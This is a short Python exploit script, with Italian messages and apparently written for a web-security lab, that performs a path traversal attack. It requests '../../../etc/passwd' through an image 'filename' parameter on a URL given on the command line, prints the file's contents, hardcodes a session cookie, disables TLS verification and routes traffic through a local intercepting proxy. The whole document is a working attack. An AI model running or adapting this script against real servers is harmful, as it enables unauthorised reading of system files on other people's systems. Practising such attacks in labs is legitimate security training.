import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : "http://127.0.0.1:8080"}



def directory_traversal_exploit(url):
    uri = "/image?filename=/var/www/images/"
    exploit = "../../../etc/passwd"
    cookies = {'session' : 'MUN810yLdoFiAqeqQcus8MEMYuj6mMs5'}
    response = requests.get(url + uri + exploit, cookies=cookies, verify=False, proxies=proxies)
    if response.status_code == 200:
        print("[+] Exploit avvenuto con successo!\n")
        print(response.text)
        return True
    else:
        return False



def main():
    if len(sys.argv) != 2:
        print("[-] Utilizzo: %s <url>" % sys.argv[0])
        print("[-] Esempio: %s www.esempio.com" % sys.argv[0])
        sys.exit()

    
    url = sys.argv[1]

    if not directory_traversal_exploit(url):
        print("[-] Exploit fallito.")





if __name__ == "__main__":
    main()